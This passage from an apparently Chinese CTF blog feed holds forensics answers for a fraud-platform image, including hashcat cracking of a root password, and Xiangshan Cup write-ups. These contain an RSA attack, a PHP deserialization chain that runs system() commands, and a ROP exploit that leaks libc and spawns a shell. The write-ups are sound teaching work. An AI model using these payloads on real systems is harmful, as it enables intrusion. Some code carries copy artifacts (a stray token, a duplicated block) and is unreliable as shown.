但是在在wp_userinfo中看 uid是2917的用户名不是”张教瘦” 是kongxin</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852169.png" alt="image-20231024210820280"></p><h3 id="10-请分析“乐享金融”建仓时间为“2022-x2F-03-x2F-01-18-44-01”，平仓时间为“2022-x2F-03-x2F-01-18-52-01”，以太坊-x2F-泰达币的这一笔交易的平仓价格是-。（标准格式：1888-668）"><a href="#10-请分析“乐享金融”建仓时间为“2022-x2F-03-x2F-01-18-44-01”，平仓时间为“2022-x2F-03-x2F-01-18-52-01”，以太坊-x2F-泰达币的这一笔交易的平仓价格是-。（标准格式：1888-668）" class="headerlink" title="10.请分析“乐享金融”建仓时间为“2022&#x2F;03&#x2F;01 18:44:01”，平仓时间为“2022&#x2F;03&#x2F;01 18:52:01”，以太坊&#x2F;泰达币的这一笔交易的平仓价格是_______。（标准格式：1888.668）"></a>10.请分析“乐享金融”建仓时间为“2022&#x2F;03&#x2F;01 18:44:01”，平仓时间为“2022&#x2F;03&#x2F;01 18:52:01”，以太坊&#x2F;泰达币的这一笔交易的平仓价格是_______。（标准格式：1888.668）</h3><p>搜索发现 以太坊是ETH</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852333.png" alt="image-20231024211430386"></p><p>将建仓时间转时间戳</p><pre><code>1646131441</code></pre><p>平仓时间转时间戳</p><pre><code>1646131921</code></pre><p>在wp_oreder中找到对应的交易记录 平仓价格就是卖出价格(sellprice)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852447.png" alt="image-20231024211911691"></p><pre><code>2896.924</code></pre><h3 id="11-请分析“乐享金融”订单编号为“202112090946233262”平仓时间是-。（标准格式：2022-1-11-1-22-43）"><a href="#11-请分析“乐享金融”订单编号为“202112090946233262”平仓时间是-。（标准格式：2022-1-11-1-22-43）" class="headerlink" title="11.请分析“乐享金融”订单编号为“202112090946233262”平仓时间是_______。（标准格式：2022-1-11.1:22:43）"></a>11.请分析“乐享金融”订单编号为“202112090946233262”平仓时间是_______。（标准格式：2022-1-11.1:22:43）</h3><pre><code>2023-10-24 21:33:46</code></pre><p>找到时间戳 再转换一下就行了</p><pre><code>1639014743</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852896.png" alt="image-20231024213326593"></p><h3 id="12-宝塔面板某用户曾尝试进行一次POST请求，参数为“-x2F-BTCloud-action-x3D-UploadFilesData”，请问该用户疑似使用的（-）电脑系统进行访问请求的。"><a href="#12-宝塔面板某用户曾尝试进行一次POST请求，参数为“-x2F-BTCloud-action-x3D-UploadFilesData”，请问该用户疑似使用的（-）电脑系统进行访问请求的。" class="headerlink" title="12.宝塔面板某用户曾尝试进行一次POST请求，参数为“&#x2F;BTCloud?action&#x3D;UploadFilesData”，请问该用户疑似使用的（ ）电脑系统进行访问请求的。"></a>12.宝塔面板某用户曾尝试进行一次POST请求，参数为“&#x2F;BTCloud?action&#x3D;UploadFilesData”，请问该用户疑似使用的（ ）电脑系统进行访问请求的。</h3><pre><code>A. Windows 8.1B. Windows 10C. Windows 11D. Windows Server 2000</code></pre><p>既然是请求 那就找request</p><p>在<code>/www/server/panel/logs/request</code> 下有宝塔的请求日志</p><p>在2022-07-23的日志中找到访问记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852140.png" alt="image-20231024213755779"></p><p><code>Windows NT 6.3</code>其实就是win8.1</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310250852411.png" alt="image-20231024213835795"></p><h3 id="13、请分析该服务器镜像最高权限“root”账户的密码是-。（标准格式：a123456）"><a href="#13、请分析该服务器镜像最高权限“root”账户的密码是-。（标准格式：a123456）" class="headerlink" title="13、请分析该服务器镜像最高权限“root”账户的密码是_______。（标准格式：a123456）"></a><strong>13、请分析该服务器镜像最高权限“root”账户的密码是_______。（标准格式：a123456）</strong></h3><p>找到&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow 直接hashcat爆破 我自己的字典爆不出来 QAQ  算是积累吧</p><pre><code>g123123</code></pre>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>香山杯-喵帕斯</title>
      <link href="/2023/10/16/%E9%A6%99%E5%B1%B1%E6%9D%AF-%E5%96%B5%E5%B8%95%E6%96%AF/"/>
      <url>/2023/10/16/%E9%A6%99%E5%B1%B1%E6%9D%AF-%E5%96%B5%E5%B8%95%E6%96%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="香山杯-喵帕斯"><a href="#香山杯-喵帕斯" class="headerlink" title="香山杯 喵帕斯"></a>香山杯 喵帕斯</h1><p>感谢明琦和yolo师傅</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310180909578.png" alt="image-20231016102525193"></p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>base64+凯撒</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151929431.png" alt="image-20231015192934847"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151930321.png" alt="image-20231015193001284"></p><p>flag{we1c0m3_2_Ctf}</p><h2 id="list"><a href="#list" class="headerlink" title="list"></a>list</h2><p>题目附件</p><pre><code>import osimport gmpy2from Crypto.Util.number import *import randomfrom secrets import flagdef pad(s,l):    return s + os.urandom(l - len(s))def gen():    g = getPrime(8)    while True:        p = g * random.getrandbits(138) + 1        if isPrime(p):            break    while True:        q = g * random.getrandbits(138) + 1        if isPrime(q):            break    N = p ** 5 * q    phi = p ** 4 * (p - 1) * (q - 1)    d = random.getrandbits(256)    e = inverse(d, phi)    E = e * g    hint = gmpy2.gcd(E, phi)    return N, E, hintflag = pad(flag,64)m = bytes_to_long(flag)n,e,hint = gen()c = pow(m,e,n)print(f&#39;hint = &#123;hint&#125;&#39;)print(f&#39;n = &#123;n&#125;&#39;)print(f&#39;e = &#123;e&#125;&#39;)print(f&#39;c = &#123;c&#125;&#39;)# hint = 251# n = 108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077# e = 3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039# c = 72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162</code></pre><p>首先要恢复 p，q.</p><p>恢复p、q后就是在有限域内开高次方的问题。</p><p>恢复p、q参考论文：<a href="https://eprint.iacr.org/2015/399.pdf">https://eprint.iacr.org/2015/399.pdf</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151931587.png" alt="image-20231015193103519"></p><p>$e*d&#x3D;1\textbf{ }mod\textbf{ }phi,gcd(e,phi)&#x3D;1\Rightarrow$</p><p>$e<em>x-1&#x3D;k</em>phi\Rightarrow$</p><p>$因为n&#x3D;p^{r}<em>q,所以gcd(e</em>x-1,n)&#x3D;gcd(p^{r}<em>(p-1)</em>(q-1),p^{r}*q)&#x3D;p^{r}$</p><p>在多项式时间内求解上面方程，用 <strong>small_roots()</strong> 就能恢复 <strong>p</strong></p><p>exp</p><pre><code>from gmpy2 import *N = 108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077E = 3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039c = 72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162e = E//gPR.&lt;x&gt; = PolynomialRing(Zmod(N))f = e*x - 1res = f.monic().small_roots(X=2^256,beta=0.44)[0]p = iroot(gcd(int(f(res)),N),4)[0]q = N//p^5print(&#39;p,q=&#39;,p,q)# sage# 开251次方from Crypto.Util.number import *import itertoolshint = 251n = 108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077e = 3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039c = 72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162p,q=69367143733862710652791985332025152581988181 ,67842402383801764742069883032864699996366777p_list = [p,q]mi = [5, 1]# print(len(mi),len(p_list))n_list = [ZZ(p_list[i]) ** mi[i] for i in range(len(mi))]# print(n_list)# print(reduce((lambda x, y: x * y), n_list) - n)   # 0# print(euler_phi(p_list[0])) # 直接求欧拉函数res=[]for pi in n_list:    d = inverse(int(e//251),euler_phi(pi))     # 对n_listt 每一个 pi 求欧拉函数    m = pow(c,d,pi)                            # m = mm^108    res.append(Zmod(pi)(m).nth_root(251, all=True))   # nth_root # 最后一部分把 e 的公因数 108 去除之后用 sage 的 nth_root 直接开根即可，爆破大概7分钟。            # 在每一个pi环里 找到可以开108次方的放进result里面            # 在环里开108次方            # 会出来 9 个 list表 对应每个 pifor vc in itertools.product(*res):    _c = [int(x) for x in vc]    m = long_to_bytes(int(crt(_c, n_list)))    if b&quot;flag&quot; in m:        print(m)# b&#39;flag&#123;4b68c7eece6be865f6da2a4323edd491&#125;\x9d\xcf\xdc\xcb\xb8\xbdd\xec\xadh\xa6C\x99\xa0)7\xfb\x02\xba\x90q8\x10+\x7f&#125;&#39;</code></pre><h2 id="PHP-unserialize-pro"><a href="#PHP-unserialize-pro" class="headerlink" title="PHP_unserialize_pro"></a>PHP_unserialize_pro</h2><p>源码</p><pre><code class="php"> &lt;?php    error_reporting(0);    class Welcome&#123;        public $name;        public $arg = &#39;welcome&#39;;        public function __construct()&#123;            $this-&gt;name = &#39;Wh0 4m I?&#39;;        &#125;        public function __destruct()&#123;            if($this-&gt;name == &#39;A_G00d_H4ck3r&#39;)&#123;                echo $this-&gt;arg;            &#125;        &#125;    &#125;    class G00d&#123;        public $shell;        public $cmd;        public function __invoke()&#123;            $shell = $this-&gt;shell;            $cmd = $this-&gt;cmd;            if(preg_match(&#39;/f|l|a|g|\*|\?/i&#39;, $cmd))&#123;                die(&quot;U R A BAD GUY&quot;);            &#125;            eval($shell($cmd));        &#125;    &#125;    class H4ck3r&#123;        public $func;        public function __toString()&#123;            $function = $this-&gt;func;            $function();        &#125;    &#125;    if(isset($_GET[&#39;data&#39;]))        unserialize($_GET[&#39;data&#39;]);    else        highlight_file(__FILE__);?&gt; </code></pre><p>反序列化 最后记得绕过对<code>f1ag</code>的过滤 </p><pre><code class="php">&lt;?phpclass Welcome&#123;    public $name;    public $arg=&#39;welcome&#39;;    public function __construct()&#123;        $this-&gt;name = &#39;Wh0 4m I?&#39;;    &#125;    public function __destruct()&#123;        if($this-&gt;name == &#39;A_G00d_H4ck3r&#39;)&#123;            echo $this-&gt;arg;        &#125;    &#125; &#125;class G00d&#123;    public $shell;    public $cmd;&#125;class H4ck3r&#123;    public $func;    public function __toString()&#123;        $function = $this-&gt;func;        $function();    &#125; &#125;$a = new Welcome();$a-&gt;name = &#39;A_G00d_H4ck3r&#39;;$a-&gt;arg = new H4ck3r();$a-&gt;arg-&gt;func = new G00d();$a-&gt;arg-&gt;func-&gt;shell = &#39;system&#39;;$a-&gt;arg-&gt;func-&gt;$cmd = &#39;cd /;more `php -r &quot;echo chr(102).chr(49).chr(97).chr(103);&quot;`&#39;;echo urlencode(serialize($a));xxxxxxxxxx &lt;?php&lt;?phpclass Welcome&#123;    public $name;    public $arg=&#39;welcome&#39;;    public function __construct()&#123;        $this-&gt;name = &#39;Wh0 4m I?&#39;;    &#125;    public function __destruct()&#123;        if($this-&gt;name == &#39;A_G00d_H4ck3r&#39;)&#123;            echo $this-&gt;arg;        &#125;    &#125; &#125;class G00d&#123;    public $shell;    public $cmd;&#125;class H4ck3r&#123;    public $func;    public function __toString()&#123;        $function = $this-&gt;func;        $function();    &#125; &#125;$a = new Welcome();$a-&gt;name = &#39;A_G00d_H4ck3r&#39;;$a-&gt;arg = new H4ck3r();$a-&gt;arg-&gt;func = new G00d();$a-&gt;arg-&gt;func-&gt;shell = &#39;system&#39;;$a-&gt;arg-&gt;func-&gt;$cmd = &#39;cd /;more `php -r &quot;echo chr(102).chr(49).chr(97).chr(103);&quot;`&#39;;echo urlencode(serialize($a));</code></pre><h2 id="Move"><a href="#Move" class="headerlink" title="Move"></a>Move</h2><p>64 位小端序</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151940550.png" alt="image-20231015194046469"></p><p>IDA 反编译</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151941050.png" alt="image-20231015194100001"></p><p>再 bss 段输入 0x20 个字节，然后判断，成功则获得 0x10 个字节溢出</p><p>1、利用 bss 段泄露 libc</p><pre><code class="python">from pwn import *from LibcSearcher import *context(arch=&#39;amd64&#39;,log_level=&#39;debug&#39;,os=&#39;linux&#39;)io = process(&#39;./pwn&#39;)pop_rdi_ret = 0x0000000000401353 #: pop rdi ; retelf = ELF(&#39;./pwn&#39;)puts_plt = elf.plt[&#39;puts&#39;]puts_got = elf.got[&#39;puts&#39;]main = elf.sym[&#39;main&#39;]shellcode = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)io.sendafter(&#39;lets travel again!\n&#39;,shellcode) #shellcode 刚 好 0x20 个 字 节 ， 所 以 不 能 使 用sendline，不然会产生回车多出了一个字节io.sendafter(&#39;Input your setp number&#39;,&#39;\x78\x56\x34\x12&#39;) #由于是小端序，所以 0x12345678 要反着写，也要使用 send，不能使用 sendlinebss = 0x04050A0leave_ret = 0x040124Bpayload = &#39;a&#39;*0x30 + p64(bss-8) + p64(leave_ret) #劫持 ebp 为 bss 的前八个字节地址（因为两个 leave，ret 会往后跳 8 个字节）--跳转到 bss 执行 shellio.sendafter(&#39;TaiCooLa&#39;,payload) #也要使用 send，不能使用 sendlineputs = u64(io.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;)) #泄露 puts 函数的真实地址print(hex(puts))</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151941437.png" alt="image-20231015194158364"></p><p>2、泄露 libc</p><pre><code>libc = LibcSearcher(&#39;puts&#39;,puts)libc_base = puts - libc.dump(&#39;puts&#39;)system = libc_base + libc.dump(&#39;system&#39;)bin_sh = libc_base + libc.dump(&#39;str_bin_sh&#39;)</code></pre><p>3、执行 shell</p><pre><code>shellcode = p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + p64(main)io.sendafter(&#39;lets travel again!\n&#39;,shellcode)payload = &#39;a&#39;*0x30 + p64(bss-8) + p64(leave_ret)io.interactive()</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151942198.png" alt="image-20231015194223148"></p><p>最终 exp</p><pre><code class="python">from pwn import *from LibcSearcher import *context(arch=&#39;amd64&#39;,log_level=&#39;debug&#39;,os=&#39;linux&#39;)io = process(&#39;./pwn&#39;)pop_rdi_ret = 0x0000000000401353 #: pop rdi ; retelf = ELF(&#39;./pwn&#39;)puts_plt = elf.plt[&#39;puts&#39;]puts_got = elf.got[&#39;puts&#39;]main = elf.sym[&#39;main&#39;]shellcode = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)io.sendafter(&#39;lets travel again!\n&#39;,shellcode)io.sendafter(&#39;Input your setp number&#39;,&#39;\x78\x56\x34\x12&#39;)bss = 0x04050A0leave_ret = 0x040124Bpayload = &#39;a&#39;*0x30 + p64(bss-8) + p64(leave_ret)io.sendafter(&#39;TaiCooLa&#39;,payload)puts = u64(io.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))print(hex(puts))libc = LibcSearcher(&#39;puts&#39;,puts)libc_base = puts - libc.dump(&#39;puts&#39;)system = libc_base + libc.dump(&#39;system&#39;)bin_sh = libc_base + libc.dump(&#39;str_bin_sh&#39;)shellcode = p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + p64(main)io.sendafter(&#39;lets travel again!\n&#39;,shellcode)payload = &#39;a&#39;*0x30 + p64(bss-8) + p64(leave_ret)io.interactive()</code></pre><h2 id="URL从哪儿来"><a href="#URL从哪儿来" class="headerlink" title="URL从哪儿来"></a>URL从哪儿来</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151945358.png" alt="image-20231015194532321"></p><p>拖到32位ida反编译后发现进行了写入文件的操作，下断点动调</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151945292.png" alt="image-20231015194546262"></p><p>双击跟进 TempFlieName 找到文件名和路径 </p><p>一直运行程序发现进行了 CloseHandle 和 DeleteFileA 的操作</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151946083.png" alt="image-20231015194603036"></p><p>重新动调，在 CloseHandle 操作前下断点然后去查看生成的临时tmp文件 </p><p>因为开启第二次动调，发现每次生成文件的文件名都不同，这次是7379</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151946840.png" alt="image-20231015194620797"></p><p>用010打开发现文件头是PE的头</p><p>改后缀为.exe后拖入ida分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151946768.png" alt="image-20231015194637735"></p><p>先是拿到一堆数据</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151946567.png" alt="image-20231015194651522"></p><p>发现进行了赋值到Block并进行了-30 的操作</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151947108.png" alt="image-20231015194702075"></p><p>跟进一下sub_401110()函数</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310151948703.png" alt="image-20231015194823672"></p><p>简单分析一下走了一个base64解码</p><pre><code class="python">import base64 cipher = [0x78, 0x8B, 0x96, 0x86, 0x78, 0x51, 0x91, 0x50, 0x6C, 0x62, 0x77, 0x53, 0x6C, 0x88, 0x63, 0x50, 0x78, 0x71, 0x4E, 0x50, 0x6B, 0x98, qui1t_p3n qui1t_p3n       0x77, 0x53, 0x6A, 0x72, 0x77, 0x97, 0x6C, 0x8B, 0x77, 0x92, 0x6C, 0x98, 0x63, 0x50, 0x6D, 0x71, 0x4E, 0x51, 0x6C, 0x62, 0x77, 0x96, 0x6C, 0x98, 0x5F,0x50, 0x6B, 0x72, 0x81, 0x51, 0x6C, 0x88, 0x64, 0x57] code = &quot;&quot; for i in range(len(cipher)):    code += chr(cipher[i] - 30) print(code) print(base64.b64decode(code)) #输出结果：#ZmxhZ3s2NDY5NjE2ZS02MzY5LTYyNmYtNzE2OS03NDYxNzA2MTc3NjF9 #b&#39;flag&#123;6469616e-6369-626f-7169-746170617761&#125;’</code></pre><h2 id="pintu"><a href="#pintu" class="headerlink" title="pintu"></a>pintu</h2><p>用montage和gaps搞了半天拼图 以为是二维码</p><p>然后并不行 查看了几个图片的大小 发现宽度都是65  但是高度各不相同 </p><p>写个脚本 分析这4703张图片的高度 并将相同高度的图片放到相同文件夹中</p><pre><code class="python">import osfrom PIL import Imageimport shutil# 输入文件夹的路径input_folder = &quot;E:\Desktop/2023香山杯\misc\pintu_26914c79abf08a72af534387e23ffdf6\pintu&quot;# 创建一个字典，用于存储不同高度的图片列表height_to_images = &#123;&#125;# 遍历输入文件夹中的图片for filename in os.listdir(input_folder):    if filename.endswith(&quot;.jpg&quot;) or filename.endswith(&quot;.png&quot;):        file_path = os.path.join(input_folder, filename)        # 打开图片并获取其高度        with Image.open(file_path) as img:            height = img.height        # 如果高度不在字典中，则创建一个新列表        if height not in height_to_images:            height_to_images[height] = []        # 将图片添加到对应高度的列表中        height_to_images[height].append(filename)# 遍历字典，将同一高度的图片复制到对应的输出文件夹中for height, images in height_to_images.items():    # 创建输出文件夹    output_folder = os.path.join(&quot;output_folder&quot;, str(height))    os.makedirs(output_folder, exist_ok=True)    for image_filename in images:        input_path = os.path.join(input_folder, image_filename)        output_path = os.path.join(output_folder, image_filename)        # 复制图片        shutil.copy(input_path, output_path)print(&quot;图片分类完成&quot;)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310152006808.png" alt="image-20231015200652767"></p><p>再加上提示的<code>tip.jpg</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310152011590.png" alt="image-20231015201119560"></p><p>联想到8进制转10进制 再看高度也符合8进制的特点</p><p>写个脚本将所有图片的高度提取出来</p><pre><code class="python">import osfrom PIL import Image# 输入文件夹的路径input_folder = &quot;E:\Desktop\pintu\pintu&quot;# 创建一个空的文本文件用于写入高度数据output_file = &quot;E:\Desktop\pintu\pintu/height.txt&quot;# 获取文件夹中所有图片文件的列表image_files = [filename for filename in os.listdir(input_folder) if filename.endswith((&quot;.png&quot;))]# 打开文本文件以进行写入with open(output_file, &quot;w&quot;) as f:    # 遍历文件夹中的图片文件列表    for i in range(1, 4074):        filename = f&#39;&#123;i&#125;.png&#39;        img = Image.open(f&#39;&#123;input_folder&#125;/&#123;filename&#125;&#39;)        height = img.height        # 将高度写入文本文件，按顺序        f.write(f&quot;&#123;height&#125;&quot;+&quot; &quot;)print(&quot;高度数据已按顺序写入 height.txt 文件&quot;)</code></pre><p>再将其转8进制 再将其转ascii码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310152046241.png" alt="image-20231015204618175"></p><pre><codecode></pre><p>再将图片的颜色的黑白 转化为0和1</p><pre><code class="python">from PIL import Imageimport oscolor = &quot;&quot;a = []for i in range(1,4704):    img = Image.open(&quot;./&#123;&#125;.png&quot;.format(i))    width,height=img.size    tmp = img.getpixel((0,0))    if (tmp == (0,0,0)):        color += &quot;0&quot;    elif(tmp == (255,255,255)):        color += &quot;1&quot;    a.append(chr(int(str(height), 8 )))print(color)</code></pre><p>在转字符串</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310152052620.png" alt="image-20231015205246528"></p><p>得到换表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310152053953.png" alt="image-20231015205336865"></p><p>保存为图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310152054963.png" alt="image-20231015205412875"></p><p>但是少文件尾 </p><p>用脚本进行上述步骤 就可以补全文件尾</p><pre><code class="python">from PIL import Imagefrom libnum import n2sfrom base64 import b32decode, b64decodeimport osbin_data = &#39;&#39;dec_data = &#39;&#39;image_directory = &#39;./pintu/&#39;for i in range(1, 4704):    image_path = os.path.join(image_directory, f&#39;&#123;i&#125;.png&#39;)    if os.path.exists(image_path):        # Open the image and extract data        with Image.open(image_path) as image:            pixel = image.getpixel((0, 0))            dec_data += chr(int(str(image.height), 8))            bin_data += &#39;1&#39; if pixel == (255, 255, 255) else &#39;0&#39;bin_data = bin_data.ljust(((len(bin_data) + 7) // 8) * 8, &#39;0&#39;)new_b64 = &#39;sUvcu5rgSeAmJQCfdXtEMKIB91Lj3niOo4hyV0b/2azpx8HqZP6wk7GNlTFYDR+W&#39;old_b64 = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;data = &#39;&#39;for dec in dec_data.split(&#39; &#39;):    data += chr(int(dec, 10))data = b32decode(data).decode()trans = &#39;&#39;.maketrans(new_b64, old_b64)b64png = b64decode(data.translate(trans)).decode().split(&#39; &#39;)[0]png_data = b64decode(b64png)with open(&#39;./flag.png&#39;, &#39;wb&#39;) as f:    f.write(png_data)</code></pre><p>一眼抽象画npiet解密</p><pre><code>.\npiet.exe -tpic E:\Desktop\pintu\flag.png</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202310161002747.png" alt="image-20231016100212654"></p><p>得到flag</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023蓝帽杯初赛取证wp</title>
      <link href="/2023/09/13/2023%E5%B9%B4%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B%E5%8F%96%E8%AF%81wp/"/>
      <url>/2023/09/13/2023%E5%B9%B4%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B%E5%8F%96%E8%AF%81wp/</url>
      
        <content type="html"><![CDATA[<h1 id="2023年蓝帽杯初赛取证wp"><a href="#2023年蓝帽杯初赛取证wp" class="headerlink" title="2023年蓝帽杯初赛取证wp"></a>2023年蓝帽杯初赛取证wp</h1><h2 id="手机"><a href="#手机" class="headerlink" title="手机"></a>手机</h2><h3 id="06-该镜像是用的什么模拟器？-答题格式-天天模拟器"><a href="#06-该镜像是用的什么模拟器？-答题格式-天天模拟器" class="headerlink" title="06.该镜像是用的什么模拟器？[答题格式:天天模拟器]"></a>06.该镜像是用的什么模拟器？[答题格式:天天模拟器]</h3><p>一眼雷电</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309192328922.png" alt="image-20230919232830871"></p><pre><code>雷电模拟器</code></pre><h3 id="07-该镜像中用的聊天软件名称是什么？-答题格式-微信"><a href="#07-该镜像中用的聊天软件名称是什么？-答题格式-微信" class="headerlink" title="07.该镜像中用的聊天软件名称是什么？[答题格式:微信]"></a>07.该镜像中用的聊天软件名称是什么？[答题格式:微信]</h3><p>将三个vmdk文件拖进火眼进行分析  找到一个聊天软件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309202232441.png" alt="image-20230920223249341"></p><pre><code>与你</code></pre><h3 id="08-聊天软件的包名是？-答题格式-com-baidu-ces"><a href="#08-聊天软件的包名是？-答题格式-com-baidu-ces" class="headerlink" title="08.聊天软件的包名是？[答题格式:com.baidu.ces]"></a>08.聊天软件的包名是？[答题格式:com.baidu.ces]</h3><p>直接搜hhh</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131425.png" alt="image-20230920225745076"></p><pre><code>com.uneed.yuni</code></pre><h3 id="09-投资理财产品中，受害人最后投资的产品最低要求投资多少钱？-答题格式-1万"><a href="#09-投资理财产品中，受害人最后投资的产品最低要求投资多少钱？-答题格式-1万" class="headerlink" title="09.投资理财产品中，受害人最后投资的产品最低要求投资多少钱？[答题格式:1万]"></a>09.投资理财产品中，受害人最后投资的产品最低要求投资多少钱？[答题格式:1万]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131426.png" alt="image-20230920230536139"></p><pre><code>5万</code></pre><h3 id="10-受害人是经过谁介绍认识王哥？-答题格式-董慧"><a href="#10-受害人是经过谁介绍认识王哥？-答题格式-董慧" class="headerlink" title="10.受害人是经过谁介绍认识王哥？[答题格式:董慧]"></a>10.受害人是经过谁介绍认识王哥？[答题格式:董慧]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131427.png" alt="image-20230920230623912"></p><pre><code>华哥</code></pre><h2 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h2><h3 id="11-请给出计算机镜像pc-e01的SHA-1值？-答案格式：字母小写"><a href="#11-请给出计算机镜像pc-e01的SHA-1值？-答案格式：字母小写" class="headerlink" title="11.请给出计算机镜像pc.e01的SHA-1值？[答案格式：字母小写]"></a>11.请给出计算机镜像pc.e01的SHA-1值？[答案格式：字母小写]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309242131428.png" alt="image-20230915153259619"></p><pre><code>ea9dcc3d43df4c6448bb56e7ac820619d66fe821</code></pre><h3 id="12-给出pc-e01在提取时候的检查员？-答案格式：admin"><a href="#12-给出pc-e01在提取时候的检查员？-答案格式：admin" class="headerlink" title="12.给出pc.e01在提取时候的检查员？[答案格式：admin]"></a>12.给出pc.e01在提取时候的检查员？[答案格式：admin]</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309172318674.png" alt="image-20230917231807642"></p><pre><code>pgs</code></pre><h3 id="13-请给出嫌疑人计算机内IE浏览器首页地址？-答案格式：http-www-baidu-com"><a href="#13-请给出嫌疑人计算机内IE浏览器首页地址？-答案格式：http-www-baidu-com" class="headerlink" title="13.请给出嫌疑人计算机内IE浏览器首页地址？[答案格式：http://www.baidu.com]"></a>13.请给出嫌疑人计算机内IE浏览器首页地址？[答案格式：<a href="http://www.baidu.com]">http://www.baidu.com]</a></h3><pre><code>http://global.bing.com/?scope=web&amp;mkt=en-US&amp;FORM=QBRE</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202309172251710.png" alt="image-20230917225110469"></p><h3 id="14-请给出嫌疑人杨某登录理财网站前台所用账号密码？-答案格式：root-x2F-admin"><a href="#14-请给出嫌疑人杨某登录理财网站前台所用账号密码？-答案格式：root-x2F-admin" class="headerlink" title="14.请给出嫌疑人杨某登录理财网站前台所用账号密码？[答案格式：root&#x2F;admin]"></a>14.请给出嫌疑人杨某登录理财网站前台所用账号密码？[答案格式：root&#x2F;admin]</h3><h3 